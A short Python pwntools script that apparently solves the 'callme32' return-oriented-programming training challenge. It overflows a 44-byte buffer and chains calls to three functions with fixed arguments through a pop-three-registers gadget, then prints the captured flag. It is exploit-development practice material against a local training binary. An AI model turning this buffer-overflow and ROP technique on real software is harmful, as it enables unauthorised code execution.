#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./callme32")

offset = 44
junk = b"A" * offset

callme1 = p32(0x080484f0)
callme2 = p32(0x08048550)
callme3 = p32(0x080484e0)

pop3ret = p32(0x080487f9) # pop esi; pop edi; pop ebp; ret;

arguments  = b""
arguments += p32(0xdeadbeef)
arguments += p32(0xcafebabe)
arguments += p32(0xd00df00d)

payload  = b""
payload += junk
payload += callme1 + pop3ret + arguments
payload += callme2 + pop3ret + arguments
payload += callme3 + pop3ret + arguments

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
